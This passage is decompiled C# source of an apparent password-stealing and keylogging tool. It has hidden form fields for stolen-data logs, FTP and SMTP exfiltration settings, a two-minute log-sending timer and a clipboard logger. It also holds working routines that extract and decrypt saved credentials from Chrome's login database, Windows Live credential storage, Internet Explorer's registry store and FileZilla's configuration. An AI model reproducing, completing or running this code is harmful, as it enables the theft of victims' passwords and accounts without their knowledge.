		((Control)rTInternetExplorer).set_Location(location);
		((Control)RTInternetExplorer).set_Name("RTInternetExplorer");
		RichTextBox rTInternetExplorer2 = RTInternetExplorer;
		size = new Size(315, 121);
		((Control)rTInternetExplorer2).set_Size(size);
		((Control)RTInternetExplorer).set_TabIndex(2);
		RTInternetExplorer.set_Text("");
		((Control)RTInternetExplorer).set_Visible(false);
		RichTextBox rTMsn = RTMsn;
		location = new Point(853, 517);
		((Control)rTMsn).set_Location(location);
		((Control)RTMsn).set_Name("RTMsn");
		RichTextBox rTMsn2 = RTMsn;
		size = new Size(313, 121);
		((Control)rTMsn2).set_Size(size);
		((Control)RTMsn).set_TabIndex(3);
		RTMsn.set_Text("");
		((Control)RTMsn).set_Visible(false);
		RichTextBox rTFileZilla = RTFileZilla;
		location = new Point(592, 465);
		((Control)rTFileZilla).set_Location(location);
		((Control)RTFileZilla).set_Name("RTFileZilla");
		RichTextBox rTFileZilla2 = RTFileZilla;
		size = new Size(313, 111);
		((Control)rTFileZilla2).set_Size(size);
		((Control)RTFileZilla).set_TabIndex(4);
		RTFileZilla.set_Text("");
		((Control)RTFileZilla).set_Visible(false);
		RichTextBox rTPCInfo = RTPCInfo;
		location = new Point(582, 392);
		((Control)rTPCInfo).set_Location(location);
		((Control)RTPCInfo).set_Name("RTPCInfo");
		RichTextBox rTPCInfo2 = RTPCInfo;
		size = new Size(313, 120);
		((Control)rTPCInfo2).set_Size(size);
		((Control)RTPCInfo).set_TabIndex(5);
		RTPCInfo.set_Text("");
		((Control)RTPCInfo).set_Visible(false);
		RichTextBox rTIMVU = RTIMVU;
		location = new Point(795, 540);
		((Control)rTIMVU).set_Location(location);
		((Control)RTIMVU).set_Name("RTIMVU");
		RichTextBox rTIMVU2 = RTIMVU;
		size = new Size(313, 121);
		((Control)rTIMVU2).set_Size(size);
		((Control)RTIMVU).set_TabIndex(6);
		RTIMVU.set_Text("");
		((Control)RTIMVU).set_Visible(false);
		RichTextBox rTNoIP = RTNoIP;
		location = new Point(828, 465);
		((Control)rTNoIP).set_Location(location);
		((Control)RTNoIP).set_Name("RTNoIP");
		RichTextBox rTNoIP2 = RTNoIP;
		size = new Size(313, 124);
		((Control)rTNoIP2).set_Size(size);
		((Control)RTNoIP).set_TabIndex(7);
		RTNoIP.set_Text("");
		((Control)RTNoIP).set_Visible(false);
		RichTextBox rTWindowsKey = RTWindowsKey;
		location = new Point(534, 437);
		((Control)rTWindowsKey).set_Location(location);
		((Control)RTWindowsKey).set_Name("RTWindowsKey");
		RichTextBox rTWindowsKey2 = RTWindowsKey;
		size = new Size(313, 111);
		((Control)rTWindowsKey2).set_Size(size);
		((Control)RTWindowsKey).set_TabIndex(8);
		RTWindowsKey.set_Text("");
		((Control)RTWindowsKey).set_Visible(false);
		RichTextBox rTPidgin = RTPidgin;
		location = new Point(778, 428);
		((Control)rTPidgin).set_Location(location);
		((Control)RTPidgin).set_Name("RTPidgin");
		RichTextBox rTPidgin2 = RTPidgin;
		size = new Size(313, 120);
		((Control)rTPidgin2).set_Size(size);
		((Control)RTPidgin).set_TabIndex(9);
		RTPidgin.set_Text("");
		((Control)RTPidgin).set_Visible(false);
		LogsSender.set_Enabled(true);
		LogsSender.set_Interval(120000);
		RichTextBox rTKLog = RTKLog;
		location = new Point(12, 12);
		((Control)rTKLog).set_Location(location);
		((Control)RTKLog).set_Name("RTKLog");
		RichTextBox rTKLog2 = RTKLog;
		size = new Size(953, 121);
		((Control)rTKLog2).set_Size(size);
		((Control)RTKLog).set_TabIndex(10);
		RTKLog.set_Text("");
		RichTextBox rTStealLog = RTStealLog;
		location = new Point(441, 564);
		((Control)rTStealLog).set_Location(location);
		((Control)RTStealLog).set_Name("RTStealLog");
		RichTextBox rTStealLog2 = RTStealLog;
		size = new Size(953, 277);
		((Control)rTStealLog2).set_Size(size);
		((Control)RTStealLog).set_TabIndex(11);
		RTStealLog.set_Text("");
		((Control)RTStealLog).set_Visible(false);
		TextBox steamCachePath = SteamCachePath;
		location = new Point(446, 847);
		((Control)steamCachePath).set_Location(location);
		((Control)SteamCachePath).set_Name("SteamCachePath");
		TextBox steamCachePath2 = SteamCachePath;
		size = new Size(100, 20);
		((Control)steamCachePath2).set_Size(size);
		((Control)SteamCachePath).set_TabIndex(12);
		((Control)SteamCachePath).set_Visible(false);
		TextBox obj = txtFTPserver;
		location = new Point(552, 847);
		((Control)obj).set_Location(location);
		((Control)txtFTPserver).set_Name("txtFTPserver");
		TextBox obj2 = txtFTPserver;
		size = new Size(100, 20);
		((Control)obj2).set_Size(size);
		((Control)txtFTPserver).set_TabIndex(13);
		((Control)txtFTPserver).set_Visible(false);
		TextBox obj3 = txtFTPuser;
		location = new Point(658, 847);
		((Control)obj3).set_Location(location);
		((Control)txtFTPuser).set_Name("txtFTPuser");
		TextBox obj4 = txtFTPuser;
		size = new Size(100, 20);
		((Control)obj4).set_Size(size);
		((Control)txtFTPuser).set_TabIndex(14);
		((Control)txtFTPuser).set_Visible(false);
		TextBox obj5 = txtFTPpass;
		location = new Point(764, 847);
		((Control)obj5).set_Location(location);
		((Control)txtFTPpass).set_Name("txtFTPpass");
		TextBox obj6 = txtFTPpass;
		size = new Size(100, 20);
		((Control)obj6).set_Size(size);
		((Control)txtFTPpass).set_TabIndex(15);
		((Control)txtFTPpass).set_Visible(false);
		TextBox obj7 = txtEmail;
		location = new Point(870, 847);
		((Control)obj7).set_Location(location);
		((Control)txtEmail).set_Name("txtEmail");
		TextBox obj8 = txtEmail;
		size = new Size(100, 20);
		((Control)obj8).set_Size(size);
		((Control)txtEmail).set_TabIndex(16);
		((Control)txtEmail).set_Visible(false);
		TextBox obj9 = txtEmailPass;
		location = new Point(976, 847);
		((Control)obj9).set_Location(location);
		((Control)txtEmailPass).set_Name("txtEmailPass");
		TextBox obj10 = txtEmailPass;
		size = new Size(100, 20);
		((Control)obj10).set_Size(size);
		((Control)txtEmailPass).set_TabIndex(17);
		((Control)txtEmailPass).set_Visible(false);
		TextBox obj11 = txtEmailSMTP;
		location = new Point(1082, 847);
		((Control)obj11).set_Location(location);
		((Control)txtEmailSMTP).set_Name("txtEmailSMTP");
		TextBox obj12 = txtEmailSMTP;
		size = new Size(100, 20);
		((Control)obj12).set_Size(size);
		((Control)txtEmailSMTP).set_TabIndex(18);
		((Control)txtEmailSMTP).set_Visible(false);
		TextBox obj13 = txtSMTPPort;
		location = new Point(1188, 847);
		((Control)obj13).set_Location(location);
		((Control)txtSMTPPort).set_Name("txtSMTPPort");
		TextBox obj14 = txtSMTPPort;
		size = new Size(100, 20);
		((Control)obj14).set_Size(size);
		((Control)txtSMTPPort).set_TabIndex(19);
		((Control)txtSMTPPort).set_Visible(false);
		TextBox obj15 = txtEmailFTP;
		location = new Point(1130, 883);
		((Control)obj15).set_Location(location);
		((Control)txtEmailFTP).set_Name("txtEmailFTP");
		TextBox obj16 = txtEmailFTP;
		size = new Size(100, 20);
		((Control)obj16).set_Size(size);
		((Control)txtEmailFTP).set_TabIndex(20);
		((Control)txtEmailFTP).set_Visible(false);
		ClipboardLog.set_Interval(10);
		RichTextBox rTBClipboard = RTBClipboard;
		location = new Point(441, 873);
		((Control)rTBClipboard).set_Location(location);
		((Control)RTBClipboard).set_Name("RTBClipboard");
		RichTextBox rTBClipboard2 = RTBClipboard;
		size = new Size(653, 148);
		((Control)rTBClipboard2).set_Size(size);
		((Control)RTBClipboard).set_TabIndex(21);
		RTBClipboard.set_Text("");
		((Control)RTBClipboard).set_Visible(false);
		lblNumb.set_AutoSize(true);
		Label obj17 = lblNumb;
		location = new Point(693, 579);
		((Control)obj17).set_Location(location);
		((Control)lblNumb).set_Name("lblNumb");
		Label obj18 = lblNumb;
		size = new Size(13, 13);
		((Control)obj18).set_Size(size);
		((Control)lblNumb).set_TabIndex(22);
		lblNumb.set_Text("0");
		((Control)lblNumb).set_Visible(false);
		RichTextBox rTKeys = RTKeys;
		location = new Point(1294, 847);
		((Control)rTKeys).set_Location(location);
		((Control)RTKeys).set_Name("RTKeys");
		RichTextBox rTKeys2 = RTKeys;
		size = new Size(100, 96);
		((Control)rTKeys2).set_Size(size);
		((Control)RTKeys).set_TabIndex(23);
		RTKeys.set_Text("");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(982, 146);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)RTKeys);
		((Control)this).get_Controls().Add((Control)(object)lblNumb);
		((Control)this).get_Controls().Add((Control)(object)RTBClipboard);
		((Control)this).get_Controls().Add((Control)(object)txtEmailFTP);
		((Control)this).get_Controls().Add((Control)(object)txtSMTPPort);
		((Control)this).get_Controls().Add((Control)(object)txtEmailSMTP);
		((Control)this).get_Controls().Add((Control)(object)txtEmailPass);
		((Control)this).get_Controls().Add((Control)(object)txtEmail);
		((Control)this).get_Controls().Add((Control)(object)txtFTPpass);
		((Control)this).get_Controls().Add((Control)(object)txtFTPuser);
		((Control)this).get_Controls().Add((Control)(object)txtFTPserver);
		((Control)this).get_Controls().Add((Control)(object)SteamCachePath);
		((Control)this).get_Controls().Add((Control)(object)RTStealLog);
		((Control)this).get_Controls().Add((Control)(object)RTKLog);
		((Control)this).get_Controls().Add((Control)(object)RTPidgin);
		((Control)this).get_Controls().Add((Control)(object)RTWindowsKey);
		((Control)this).get_Controls().Add((Control)(object)RTNoIP);
		((Control)this).get_Controls().Add((Control)(object)RTIMVU);
		((Control)this).get_Controls().Add((Control)(object)RTPCInfo);
		((Control)this).get_Controls().Add((Control)(object)RTFileZilla);
		((Control)this).get_Controls().Add((Control)(object)RTMsn);
		((Control)this).get_Controls().Add((Control)(object)RTInternetExplorer);
		((Control)this).get_Controls().Add((Control)(object)RTChrome);
		((Control)this).get_Controls().Add((Control)(object)RTFirefox);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CredEnumerate(string filter, int flag, ref int count, ref IntPtr pCredentials);

	public void MSN()
	{
		int count = 0;
		IntPtr pCredentials = IntPtr.Zero;
		IntPtr[] array = null;
		checked
		{
			if (CredEnumerate("WindowsLive:name=*", 0, ref count, ref pCredentials))
			{
				array = new IntPtr[count - 1 + 1];
				IntPtr ptr = pCredentials;
				int num = count - 1;
				CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
				for (int i = 0; i <= num; i++)
				{
					ref IntPtr reference = ref array[i];
					reference = Marshal.ReadIntPtr(ptr, IntPtr.Size * i);
					CREDENTIAL cREDENTIAL = (CREDENTIAL)Marshal.PtrToStructure(array[i], typeof(CREDENTIAL));
					DATA_BLOB2 pDataIn = default(DATA_BLOB2);
					DATA_BLOB2 pDataOut = default(DATA_BLOB2);
					pDataIn.pbData = cREDENTIAL.lpbCredentialBlob;
					pDataIn.cbData = cREDENTIAL.dwCredentialBlobSize;
					string szDataDescr = Conversions.ToString(0);
					int pOptionalEntropy = 0;
					IntPtr pvReserved = (IntPtr)0;
					CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = cRYPTPROTECT_PROMPTSTRUCT;
					CryptUnprotectData(ref pDataIn, szDataDescr, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 1, ref pDataOut);
					RichTextBox rTMsn = RTMsn;
					rTMsn.set_Text(rTMsn.get_Text() + "-------------------------\r\nUsername: " + Marshal.PtrToStringAuto(cREDENTIAL.lpUserName) + "\r\nPassword: " + Marshal.PtrToStringAuto(pDataIn.pbData) + "\r\n-------------------------\r\n");
				}
			}
		}
	}

	public void Chrome()
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		SQLiteConnection val = default(SQLiteConnection);
		SQLiteCommand val2 = default(SQLiteCommand);
		SQLiteDataReader val3 = default(SQLiteDataReader);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		ListViewItem val4 = default(ListViewItem);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 586:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001d;
						case 4:
							goto IL_002b;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_004f;
						case 7:
							goto IL_0059;
						case 8:
							goto IL_0064;
						case 9:
							goto IL_0072;
						case 12:
							goto IL_0083;
						case 13:
							goto IL_0099;
						case 14:
							goto IL_00b0;
						case 15:
							goto IL_00cb;
						case 16:
							goto IL_00fa;
						case 17:
							goto IL_0105;
						case 18:
							goto IL_0111;
						case 19:
							goto IL_0124;
						case 20:
							goto IL_0136;
						case 21:
							goto IL_018d;
						case 10:
						case 11:
						case 22:
						case 23:
							goto IL_01a2;
						case 24:
							goto IL_01b2;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_018d:
					num = 21;
					RTChrome.set_Text(chpasses);
					goto IL_01a2;
					IL_0008:
					num = 2;
					text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
					goto IL_001d;
					IL_001d:
					num = 3;
					if (!File.Exists(text))
					{
						goto end_IL_0000_3;
					}
					goto IL_002b;
					IL_002b:
					num = 4;
					val = new SQLiteConnection();
					goto IL_0035;
					IL_0035:
					num = 5;
					val.set_ConnectionString("Data Source=" + text + ";");
					goto IL_004f;
					IL_004f:
					num = 6;
					val.Open();
					goto IL_0059;
					IL_0059:
					num = 7;
					val2 = val.CreateCommand();
					goto IL_0064;
					IL_0064:
					num = 8;
					val2.set_CommandText("SELECT * FROM logins");
					goto IL_0072;
					IL_0072:
					num = 9;
					val3 = val2.ExecuteReader();
					goto IL_01a2;
					IL_01a2:
					num = 11;
					if (val3.Read())
					{
						goto IL_0083;
					}
					goto IL_01b2;
					IL_01b2:
					num = 24;
					((Component)(object)val2).Dispose();
					break;
					IL_0083:
					num = 12;
					text2 = Conversions.ToString(val3.get_Item("origin_url"));
					goto IL_0099;
					IL_0099:
					num = 13;
					text3 = Conversions.ToString(val3.get_Item("username_value"));
					goto IL_00b0;
					IL_00b0:
					num = 14;
					text4 = Decrypt((byte[])val3.get_Item("password_value"));
					goto IL_00cb;
					IL_00cb:
					num = 15;
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						goto IL_00fa;
					}
					goto IL_01a2;
					IL_00fa:
					num = 16;
					val4 = new ListViewItem();
					goto IL_0105;
					IL_0105:
					num = 17;
					val4.set_Text(text2);
					goto IL_0111;
					IL_0111:
					num = 18;
					val4.get_SubItems().Add(text3);
					goto IL_0124;
					IL_0124:
					num = 19;
					val4.get_SubItems().Add(text4);
					goto IL_0136;
					IL_0136:
					num = 20;
					chpasses = chpasses + "-------------------------\r\nWebsite: " + text2 + "\r\nUsername: " + text3 + "\r\nPassword: " + text4 + "\r\n-------------------------\r\n";
					goto IL_018d;
					end_IL_0000_2:
					break;
				}
				num = 25;
				val.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 586;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB2 pDataIn, string szDataDescr, ref int pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB2 pDataOut);

	public static string Decrypt(byte[] Datas)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
		IntPtr pvReserved = default(IntPtr);
		string text = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						DATA_BLOB2 pDataIn = default(DATA_BLOB2);
						DATA_BLOB2 pDataOut = default(DATA_BLOB2);
						GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
						pDataIn.pbData = gCHandle.AddrOfPinnedObject();
						pDataIn.cbData = (IntPtr)Datas.Length;
						gCHandle.Free();
						int pOptionalEntropy = 0;
						CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = cRYPTPROTECT_PROMPTSTRUCT;
						CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
						byte[] array = new byte[(int)pDataOut.cbData + 1];
						Marshal.Copy(pDataOut.pbData, array, 0, (int)pDataOut.cbData);
						string @string = Encoding.Default.GetString(array);
						text = @string.Substring(0, @string.Length - 1);
						break;
					}
					case 177:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_00eb;
						}
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 177;
				continue;
			}
			break;
			IL_00eb:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		string result = text;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void Firefox()
	{
		dec dec = new dec();
		dec.Decrypt();
	}

	[DllImport("advapi32.dll")]
	public static extern bool CryptAcquireContext(ref IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool CryptGetHashParam(IntPtr hHash, int param, byte[] digest, ref int length, int flags);

	[DllImport("advapi32.dll")]
	public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDeriveKey(IntPtr hProv, uint Algid, IntPtr hBaseData, uint dwFlags, ref IntPtr phKey);

	[DllImport("advapi32.dll")]
	public static extern bool CryptCreateHash(IntPtr hProv, uint Algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

	[DllImport("advapi32.dll")]
	public static extern bool CryptHashData(IntPtr hHash, IntPtr pbData, int dwDataLen, uint dwFlags);

	[DllImport("advapi32.dll")]
	public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen, uint dwBufLen);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDestroyHash(IntPtr hHash);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDestroyKey(IntPtr hKey);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.LPTStr)] string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool FindNextUrlCacheEntry(IntPtr hEnumHandle, IntPtr lpNextCacheEntryInfo, ref int lpdwNextCacheEntryInfoBufferSize);

	[DllImport("wininet.dll")]
	public static extern bool FindCloseUrlCache(IntPtr hEnumHandle);

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, int szDataDescr, ref DATA_BLOB pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	public static string GetSHA1Hash(string pbData, int length)
	{
		byte[] array = new byte[21];
		string text = "";
		int length2 = 20;
		IntPtr phProv = default(IntPtr);
		CryptAcquireContext(ref phProv, null, null, 1u, 0u);
		IntPtr phHash = default(IntPtr);
		CryptCreateHash(phProv, 32772u, IntPtr.Zero, 0u, ref phHash);
		CryptHashData(phHash, VarPtr(pbData), length, 0u);
		CryptGetHashParam(phHash, 2, array, ref length2, 0);
		CryptDestroyHash(phHash);
		CryptReleaseContext(phProv, 0u);
		int location = 0;
		while (location < 20)
		{
			text += Strings.Right("00" + array[location].ToString("X"), 2);
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		return text + Strings.Right("00" + CheckSum(text).ToString("X"), 2);
	}

	public static byte CheckSum(string s)
	{
		int num = 0;
		int location = 1;
		while (location < s.Length)
		{
			if (location % 2 != 0)
			{
				num = checked(num + Convert.ToInt32(Conversion.Val("&H" + Strings.Mid(s, location, 2))));
			}
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		return Convert.ToByte(num % 256);
	}

	public void DecryptCredential(string sURL, string sHash, int Length, byte[] data)
	{
		DATA_BLOB pDataIn = default(DATA_BLOB);
		DATA_BLOB pDataOut = default(DATA_BLOB);
		DATA_BLOB pOptionalEntropy = default(DATA_BLOB);
		StringIndexHeader stringIndexHeader = default(StringIndexHeader);
		StringIndexEntry stringIndexEntry = default(StringIndexEntry);
		IntPtr intPtr = Marshal.AllocHGlobal(Length);
		Marshal.Copy(data, 0, intPtr, Length);
		pDataIn.cbData = Length;
		pDataIn.pbData = intPtr;
		checked
		{
			pOptionalEntropy.cbData = (sURL.Length + 1) * 2;
			pOptionalEntropy.pbData = VarPtr(sURL);
			if (!CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut))
			{
				return;
			}
			IntPtr ptr = new IntPtr(pDataOut.pbData.ToInt32() + unchecked((int)Marshal.ReadByte(pDataOut.pbData)));
			stringIndexHeader = (StringIndexHeader)Marshal.PtrToStructure(ptr, stringIndexHeader.GetType());
			if (stringIndexHeader.dwType != 1 || stringIndexHeader.dwEntriesCount < 2)
			{
				return;
			}
			IntPtr ptr2 = new IntPtr(ptr.ToInt32() + stringIndexHeader.dwStructSize);
			IntPtr intPtr2 = new IntPtr(ptr2.ToInt32() + (stringIndexHeader.dwEntriesCount + 0) * Marshal.SizeOf((object)stringIndexEntry));
			int location = 0;
			while ((double)location < (double)stringIndexHeader.dwEntriesCount / 2.0)
			{
				if (location != 0)
				{
					ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)stringIndexEntry));
				}
				stringIndexEntry = (StringIndexEntry)Marshal.PtrToStructure(ptr2, stringIndexEntry.GetType());
				IntPtr ptr3 = new IntPtr(intPtr2.ToInt32() + stringIndexEntry.dwDataOffset);
				string text = Marshal.PtrToStringAuto(ptr3);
				ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)stringIndexEntry));
				stringIndexEntry = (StringIndexEntry)Marshal.PtrToStructure(ptr2, stringIndexEntry.GetType());
				ptr3 = new IntPtr(intPtr2.ToInt32() + stringIndexEntry.dwDataOffset);
				string text2 = Marshal.PtrToStringAuto(ptr3);
				RichTextBox rTInternetExplorer = RTInternetExplorer;
				rTInternetExplorer.set_Text(rTInternetExplorer.get_Text() + "-------------------------\r\nWebsite: " + sURL + "\r\nUsername: " + text + "\r\nPassword: " + text2 + "\r\nHash: " + sHash + "\r\n-------------------------\r\n");
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
	}

	public static IntPtr VarPtr(object o)
	{
		return GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject();
	}

	public static string Right(string param, int length)
	{
		return param.Substring(checked(param.Length - length), length);
	}

	public static string Mid(string param, int startIndex, int length)
	{
		return param.Substring(startIndex, length);
	}

	public void InternetExplorer()
	{
		int lpdwFirstCacheEntryInfoBufferSize = 0;
		FindFirstUrlCacheEntry(null, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
		if (Marshal.GetLastWin32Error() == 259)
		{
			return;
		}
		int num = lpdwFirstCacheEntryInfoBufferSize;
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		checked
		{
			try
			{
				IntPtr hEnumHandle = FindFirstUrlCacheEntry(null, intPtr, ref lpdwFirstCacheEntryInfoBufferSize);
				bool flag;
				do
				{
					INTERNET_CACHE_ENTRY_INFO iNTERNET_CACHE_ENTRY_INFO = (INTERNET_CACHE_ENTRY_INFO)Marshal.PtrToStructure(intPtr, typeof(INTERNET_CACHE_ENTRY_INFO));
					string lpszSourceUrlName = iNTERNET_CACHE_ENTRY_INFO.lpszSourceUrlName;
					lpszSourceUrlName = lpszSourceUrlName.ToLower();
					lpszSourceUrlName = lpszSourceUrlName.Substring(lpszSourceUrlName.IndexOf("@") + 1);
					if (lpszSourceUrlName.IndexOf("?") > 0)
					{
						lpszSourceUrlName = lpszSourceUrlName.Substring(0, lpszSourceUrlName.IndexOf("?"));
					}
					string sHA1Hash = GetSHA1Hash(lpszSourceUrlName, (lpszSourceUrlName.Length + 1) * 2);
					byte[] array = (byte[])Registry.CurrentUser.OpenSubKey(IE_KEY)!.GetValue(sHA1Hash, null);
					if (array != null)
					{
						if (!visited.Contains(lpszSourceUrlName))
						{
							DecryptCredential(lpszSourceUrlName, sHA1Hash, array.Length, array);
							visited = visited + lpszSourceUrlName + " ";
						}
					}
					else
					{
						lpszSourceUrlName += "/";
						string sHA1Hash2 = GetSHA1Hash(lpszSourceUrlName, (lpszSourceUrlName.Length + 1) * 2);
						byte[] array2 = (byte[])Registry.CurrentUser.OpenSubKey(IE_KEY)!.GetValue(sHA1Hash2, null);
						if (array2 != null && !visited.Contains(lpszSourceUrlName))
						{
							DecryptCredential(lpszSourceUrlName, sHA1Hash2, array2.Length, array2);
							visited = visited + lpszSourceUrlName + " ";
						}
					}
					lpdwFirstCacheEntryInfoBufferSize = num;
					if (((flag = FindNextUrlCacheEntry(hEnumHandle, intPtr, ref lpdwFirstCacheEntryInfoBufferSize)) || Marshal.GetLastWin32Error() != 259) && !flag && lpdwFirstCacheEntryInfoBufferSize > num)
					{
						num = lpdwFirstCacheEntryInfoBufferSize;
						IntPtr cb = new IntPtr(num);
						intPtr = Marshal.ReAllocHGlobal(intPtr, cb);
						flag = true;
					}
				}
				while (flag);
			}
			finally
			{
				Marshal.FreeHGlobal(intPtr);
			}
			visited = "";
		}
	}

	public string GetBetween(ref string strSource, ref string strStart, ref string strEnd, ref int startPos = 0)
	{
		checked
		{
			string result = default(string);
			try
			{
				int length = strStart.Length;
				string text = string.Empty;
				int num = strSource.IndexOf(strStart, startPos);
				int num2 = strSource.IndexOf(strEnd, num + length);
				if (num != -1 && num2 != -1)
				{
					text = strSource.Substring(num + length, num2 - (num + length));
				}
				result = text;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public void Filezilla()
	{
		try
		{
			string environmentVariable = Environment.GetEnvironmentVariable("APPDATA");
			if (File.Exists(environmentVariable + "\\FileZilla\\filezilla.xml"))
			{
				StreamReader streamReader = new StreamReader(environmentVariable + "\\FileZilla\\filezilla.xml");
				string strSource = streamReader.ReadToEnd();
				while (Strings.InStr(strSource, "<Host>", (CompareMethod)0) != 0)
				{
					string strStart = "<User>";
					string strEnd = "</User>";
					int startPos = 0;
					string between = GetBetween(ref strSource, ref strStart, ref strEnd, ref startPos);
					strEnd = "<Pass>";
					strStart = "</Pass>";
					startPos = 0;
					string between2 = GetBetween(ref strSource, ref strEnd, ref strStart, ref startPos);
					strEnd = "<Host>";
					strStart = "</Host>";
					startPos = 0;
					string between3 = GetBetween(ref strSource, ref strEnd, ref strStart, ref startPos);
					strSource = strSource.Replace("<User>" + between + "</User>", "");
					strSource = strSource.Replace("<Pass>" + between2 + "</Pass>", "");
					strSource = strSource.Replace("<Host>" + between3 + "</Host>", "");
					RTFileZilla.set_Text(RTFileZilla.get_Text() + "=FileZilla Steal=\r\n");
					RTFileZilla.set_Text(RTFileZilla.get_Text() + "Host : " + between3 + "\r\nUsername : " + between + "\r\nPassword : " + between2 + "\r\n");
				}
			}
			else
			{
				RTFileZilla.set_Text("No FileZilla Passwords Saved.");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool UserIsAdministrator()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			return true;
		}
		return false;
	}

	public void PCInfo()
	{
		string text = ((!UserIsAdministrator()) ? "False" : "True");
